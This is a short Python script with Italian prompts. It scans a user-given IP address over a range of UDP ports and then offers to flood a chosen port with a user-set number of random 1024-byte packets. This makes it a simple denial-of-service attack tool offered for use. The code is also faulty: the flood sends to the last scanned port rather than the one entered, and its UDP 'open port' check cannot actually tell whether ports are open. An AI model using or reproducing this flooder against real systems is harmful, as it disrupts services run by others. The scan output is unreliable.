import socket
import random
import sys


target = input("Inserisci l'IP da scansionare:\n")
portrange = input("Inserisci il range di porte da scansionare tra 1 e 1024 (es. 10-300)\n")

def udp_flood(target, port0, numero):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(1024)

    for _ in range(numero):
        s.sendto(bytes, (target, port))
        print(f"Pacchetto inviato a IP {target}  PORT {port}")


lowport = int(portrange.split('-')[0])
highport = int(portrange.split('-')[1])

print(f"Scansiono l'indirizzo {target} dalla porta {lowport} alla {highport}\n")

openPort = []
for port in range(lowport, highport+1):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    status = s.connect_ex((target, port))
    if(status == 0):
        print(f"Porta {port}-APERTA")
        openPort.append(port)
    else:
        if(status != 1):
            print(f"Porta {port}-CHIUSA")
    s.close()
print(f"Le porte aperte sono le seguenti:\n{openPort}")

print("Vuoi procedere con udpflood?")

yesno = input("y/n")

if(yesno == 'y'):
    port0 = int(input("Inserire la porta su cui eseguire udpflood:\n"))
    numero = int(input("Inserire il numero di pacchetti da inviare:\n"))
    udp_flood(target, port0, numero)
if(yesno == 'n'):
    sys.exit()
else:
    sys.exit()